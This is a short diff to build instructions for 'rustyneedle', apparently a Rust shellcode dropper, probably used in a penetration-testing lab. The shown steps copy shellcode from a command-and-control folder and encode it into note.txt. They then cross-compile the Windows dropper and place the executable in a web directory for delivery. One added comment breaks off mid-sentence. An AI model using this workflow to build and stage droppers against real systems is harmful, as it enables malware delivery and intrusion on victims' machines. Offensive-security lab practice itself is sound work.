@@ -29,11 +29,15 @@ cp ~/c2/shellcode.bin .
 # Encode the shellcode. note that the output file name is note.txt
 python3 rustyneedle/encode.py shellcode.bin 3 note.txt
 
+# Take note of where in the dropper we put the downloaded url, and put the note.txt s
+
 # Compile the main.rs dropper
 cargo build --target x86_64-pc-windows-gnu --release
 
-# Navigate the binary
-cp target/x86_64-pc-windows-gnu/release/rustyneedle.exe
+# Navigate the binary and put it where we want
+cp target/x86_64-pc-windows-gnu/release/rustyneedle.exe ~/prolab/cybernetic/web
+
+
 
 ```
 
